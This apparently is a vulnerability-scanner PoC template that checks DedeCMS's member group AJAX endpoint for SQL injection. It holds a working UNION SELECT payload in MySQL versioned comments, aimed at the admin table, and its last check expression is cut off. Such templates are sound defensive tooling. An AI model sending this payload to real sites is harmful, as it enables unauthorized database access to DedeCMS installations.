name: poc-yaml-dedecms-membergroup-sqli
set:
  r: randomInt(800000000, 1000000000)
  ident: "md5{{r}}"
rules:
  - method: GET
    path: /member/ajax_membergroup.php?action=post&membergroup=1
    follow_redirects: true
    expression: |
      response.status == 200 && response.body.bcontains(b"EditMemberGroup(0)")
  - method: GET
    path: >-
      /member/ajax_membergroup.php?action=post&membergroup=@`'`
      /*!50000Union+*/+/*!50000select+*/{{ident}} -- from `%23@__admin` where 1 or
      id=@`'`
    follow_redirects: true
    expression: |
      response.status == 200 && response.body.contains(md5(string(r))

